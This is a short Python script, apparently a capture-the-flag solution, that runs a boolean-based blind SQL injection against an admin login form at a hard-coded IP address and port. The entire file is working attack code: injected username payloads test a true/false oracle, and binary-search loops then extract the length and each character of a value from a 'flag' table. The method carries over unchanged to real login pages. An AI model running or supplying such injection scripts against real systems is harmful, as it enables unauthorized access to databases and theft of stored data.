import http.client

HOST = '160.202.254.160'
PORT = 19353
PATH = '/admin/login'

def test(payload):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    body = "username=" + payload + "&password=123456"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    conn.request('POST', PATH, body=body.encode(), headers=headers)
    resp = conn.getresponse()
    result = resp.read().decode()
    conn.close()
    return 'Redirecting' in result

# Verify
print("COUNT>0:", test("test' AND (SELECT COUNT(*) FROM flag)>0 AND '1'='1"))
print("COUNT=0:", test("test' AND (SELECT COUNT(*) FROM flag)=0 AND '1'='1"))
print("1=1:", test("test' AND 1=1 AND '1'='1"))
print("1=2:", test("test' AND 1=2 AND '1'='1"))

# Binary search for flag length
lo, hi = 1, 80
while lo < hi:
    mid = (lo + hi) // 2
    r = test("test' AND (SELECT LENGTH(flag) FROM flag LIMIT 1)>" + str(mid) + " AND '1'='1")
    if r:
        lo = mid + 1
    else:
        hi = mid
flag_len = lo
print(f"\nFlag length: {flag_len}")

# Binary search each character
flag = ""
for pos in range(1, flag_len + 1):
    lo_c, hi_c = 32, 126
    while lo_c < hi_c:
        mid_c = (lo_c + hi_c) // 2
        payload = "test' AND ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1)," + str(pos) + ",1))>" + str(mid_c) + " AND '1'='1"
        r = test(payload)
        if r:
            lo_c = mid_c + 1
        else:
            hi_c = mid_c
    flag += chr(lo_c)
    print(f'[{pos}] {chr(lo_c)} => {flag}')

print(f'\nFlag: {flag}')
